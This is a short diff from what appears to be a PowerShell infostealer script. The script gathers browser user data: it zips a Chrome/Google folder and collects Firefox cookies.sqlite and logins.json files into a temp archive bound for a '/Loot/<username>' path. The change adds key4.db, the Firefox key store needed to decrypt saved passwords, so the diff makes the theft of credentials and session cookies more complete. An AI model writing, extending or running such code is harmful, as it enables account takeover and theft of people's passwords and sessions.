@@ -29,7 +29,7 @@ Compress-Archive -Path $GoogleFolderPath -DestinationPath $GfilePath
 #
 
 $SearchPath = "C:\Users\$env:UserName\AppData\Roaming\Mozilla\Firefox\Profiles"
-$FilesToSearch = @("cookies.sqlite", "cookies.sqlite-shm", "cookies.sqlite-wal", "logins.json", "logins-backup.json")
+$FilesToSearch = @("cookies.sqlite", "cookies.sqlite-shm", "cookies.sqlite-wal", "logins.json", "logins-backup.json", "key4.db")
 $TempFolderPath = "$env:tmp\Firefox-UserData\"
 $FfilePath = "$env:tmp\Firefox-UserData.zip"
 $FdestinationPath = "/Loot/$env:USERNAME/Firefox-UserData.zip"
